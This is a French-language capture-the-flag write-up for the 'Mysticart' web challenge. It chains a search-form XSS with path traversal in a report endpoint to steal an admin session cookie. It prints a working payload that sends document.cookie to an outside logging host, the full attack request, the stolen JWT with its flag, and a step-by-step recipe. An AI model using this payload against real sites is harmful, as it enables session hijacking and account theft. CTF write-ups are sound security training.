
---

## Write-up WEB Mysticart Hacklantique CTF

On a un site avec different article. Sur la page d’accueil, il y a un formulaire qui nous permet de rechercher un article.  
Ce formulaire est sensible au XSS, donc on prépare une XSS qui permet d’exfiltrer les cookies :

```html
<script>javascript:fetch('https://wanako.free.beeceptor.com/log?data='.concat(btoa(document.cookie)));</script>
```

Ensuite, on utilise un endpoint disponible sur les pages de produit permettant d’envoyer au administrateur un problème.  
Donc c’est `/report?id=1`.  
Cette endpoint est disponible sur `/produit/1` par exemple.

Donc l’idée c’est de se dire que le serveur devrait automatiquement faire le lien entre `/report?id=X` et `/produit/X`.  
Donc si à la place de X on met `"../?search="`, on arrive au niveau du formulaire vulnérable au XSS :

```js
fetch('http://94.237.48.197:33784/report?id=../?search=XSS')
```

```js
fetch('http://94.237.48.197:33784/report?id=../?search=<script>javascript:fetch(\'https://wanako.free.beeceptor.com/log?data=\'.concat(btoa(document.cookie)));</script>')
```

Grâce à cela, on récupère son token de session :

```
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9yb2xlIjoiYWRtaW4iLCJmbGFnIjoiSFRCe0YxWF9ZMFVyX3g1NV9NNG5fMXQ1X2Q0bmdlcjB1cyFfNGJlYzI2MDBlNmFkMTAxZjkxOTJiYjkzM2ZlNDUyZjR9IiwiaWF0IjoxNzQzMDg1ODcyfQ.VEnFLDrSbn0JnghXMfAW-ASXqgUS9U_UX2L_kt5Jq3c
```

C’est un token JWT, donc on peut utiliser un jwt-decoder  
<https://fusionauth.io/dev-tools/jwt-decoder> et hop :

```json
{
  "username": "admin",
  "user_role": "admin",
  "flag": "HTB{F1X_Y0Ur_x55_M4n_1t5_d4nger0us!...}",
  "iat": 1743085872
}
```

---

### Donc pour réaliser cette exploit :

- Encoder la XSS au format URL : <https://www.urlencoder.org/>  
- Préparer une balise `fetch` qui exécutera la XSS  
- Préparer une page JS contenant la requête à exécuter  
- Mettre en place un endpoint qui recevra les cookies admin  
- Décoder le cookie reçu  

---